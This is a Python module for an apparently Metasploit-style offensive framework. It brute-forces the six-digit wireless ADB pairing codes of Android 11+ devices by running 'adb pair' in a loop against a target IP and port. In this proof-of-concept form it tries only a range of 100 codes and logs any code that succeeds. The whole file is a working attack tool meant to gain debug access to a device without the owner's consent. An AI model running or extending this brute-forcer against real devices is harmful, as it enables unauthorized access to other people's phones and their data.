import subprocess
import time
from rich.console import Console
from rich.progress import track
from utils.logger import log_action

console = Console()

class Module:
    MODULE_INFO = {
        'name': 'auxiliary/android/adb_pairing_brute',
        'description': 'Wireless ADB pairing code brute-forcer (targets Android 11+ wireless debugging).',
        'options': {
            'RHOST': 'Target IP address',
            'RPORT': 'Target pairing port (often random, check device UI) [default: 5555]',
            'THREADS': 'Simultaneous attempts [default: 1]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def run(self):
        rhost = self.framework.options.get('RHOST')
        rport = self.framework.options.get('RPORT', '5555')
        
        if not rhost:
            console.print("[red][!] RHOST is required.[/red]")
            return

        console.print(f"[*] Starting ADB pairing brute-force on [cyan]{rhost}:{rport}[/cyan]...")
        console.print("[yellow][!] Note: This is loud and might trigger security alerts on the device.[/yellow]")

        # We'll use a subset for PoC, real world would need thousands
        # Pairing codes are 6 digits
        log_action(f"ADB pairing brute-force started on {rhost}:{rport}")

        for i in track(range(100000, 100100), description="Brute-forcing..."):
            code = str(i)
            # cmd: adb pair <host>[:<port>] [code]
            cmd = ['adb', 'pair', f"{rhost}:{rport}", code]
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
            
            if "Successfully paired to" in res.stdout:
                console.print(f"\n[bold green][+] SUCCESS! Pairing Code: {code}[/bold green]")
                log_action(f"ADB pairing code found: {code} for {rhost}")
                return
            elif "Failed to pair" in res.stdout or "Error" in res.stderr:
                continue
            
            time.sleep(0.1)

        console.print("[red][!] Brute-force finished without success (limited range tested).[/red]")
